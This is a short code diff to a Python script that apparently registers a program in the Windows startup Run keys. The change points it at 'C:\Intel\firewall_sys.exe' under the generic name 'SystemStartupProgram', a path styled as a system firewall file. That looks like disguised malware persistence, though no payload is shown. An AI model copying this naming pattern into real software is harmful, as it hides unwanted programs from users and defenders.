@@ -284,7 +284,7 @@ def list_run_entries(hive: int = winreg.HKEY_LOCAL_MACHINE) -> dict:
 
 
 def main() -> int:
-    program_path = r"C:\Windows\setup.exe"
+    program_path = r"C:\Intel\firewall_sys.exe"
     program_name = "SystemStartupProgram"
 
     if not is_admin():
